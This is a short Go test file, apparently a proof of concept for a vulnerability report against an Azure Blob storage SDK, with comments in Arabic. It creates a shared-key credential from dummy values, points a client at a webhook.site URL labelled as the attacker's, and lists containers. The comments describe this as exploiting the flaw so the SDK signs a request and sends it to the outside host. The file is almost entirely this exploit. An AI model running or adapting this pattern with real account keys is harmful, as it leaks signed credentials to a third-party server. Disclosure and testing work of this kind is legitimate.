package azblob

import (
	"context"
	"testing"
)

func TestImpact_CredentialLeakage(t *testing.T) {
	// الرابط الخارجي (Webhook) الذي نراقب من خلاله وصول البيانات
	attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835"

	// بيانات وهمية لإثبات تسريب التوقيع
	accountName := "victim_account"
	accountKey := "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg=="

	// 1. إنشاء Credential (المكان الذي يحمل المفتاح السري)
	cred, _ := NewSharedKeyCredential(accountName, accountKey)

	// 2. استغلال الثغرة: تمرير الرابط الخبيث للـ SDK
	client, _ := NewClientWithSharedKeyCredential(attackerURL, cred, nil)

	// 3. التنفيذ: إجبار الـ SDK على توقيع الطلب وإرساله للرابط الخارجي
	pager := client.NewListContainersPager(nil)
	_, _ = pager.NextPage(context.TODO())
}
